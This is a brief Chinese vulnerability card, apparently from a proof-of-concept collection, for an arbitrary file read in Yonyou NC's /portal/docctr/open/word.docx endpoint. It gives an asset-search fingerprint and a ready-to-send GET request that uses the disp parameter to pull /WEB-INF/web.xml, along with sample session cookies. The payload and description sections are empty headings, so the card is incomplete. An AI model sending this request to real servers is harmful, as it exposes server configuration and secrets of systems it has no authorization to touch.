# 用友NCword存在任意文件读取漏洞

- **系统**：用友　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name=="用友 UAP"`
- **请求**：`GET /portal/docctr/open/word.docx?disp=/WEB-INF/web.xml HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: JSESSIONID=3EFAE3813FC1841BBE27D4962DBE8CE7.server; JSESSIONID=0D4B431EE47FB5194…`　`If-Modified-Since: Wed, 22 Nov 2023 01:06:17 GMT`　`If-None-Match: W/"15377-1700615177018"`

**请求体 / payload**
```

```

**其他**
- 用友NC word存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友NC